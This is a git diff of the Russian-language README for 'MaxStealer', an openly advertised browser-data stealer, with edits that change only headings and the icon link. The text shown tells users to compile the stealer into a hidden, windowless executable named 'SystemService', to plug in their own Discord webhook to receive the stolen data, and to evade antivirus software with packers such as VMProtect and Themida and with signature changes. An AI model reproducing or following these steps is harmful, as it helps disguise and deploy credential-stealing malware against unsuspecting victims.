@@ -1,4 +1,4 @@
-# <img src="https://i.imgur.com/9E8pXbW.png" width=40> MaxStealer
+# <img src="https://raw.githubusercontent.com/VZXdev/MaxStealer/refs/heads/main/icon.ico" width=40> MaxStealer
 
 > Профессиональный инструмент для сбора данных браузеров с необнаруживаемой работой
 
@@ -42,11 +42,11 @@ pip install pyinstaller
 ```bash
 pyinstaller --onefile --noconsole --name SystemService --icon=NONE stealer.py
 ```
-## ⚠️ Важные заметки
+# ⚠️ Важные заметки
 
-# Замените ваш_вебхук в коде на свой Discord Webhook URL
+## Замените ваш_вебхук в коде на свой Discord Webhook URL
 
-# Для обхода антивирусов используйте:
+## Для обхода антивирусов используйте:
 
 1. Упаковщики (VMProtect, Themida)
 
@@ -54,4 +54,4 @@ pyinstaller --onefile --noconsole --name SystemService --icon=NONE stealer.py
 
 3. Смена сигнатур
 
-Разработчик не несет ответственности за использование
+# Разработчик не несет ответственности за использование
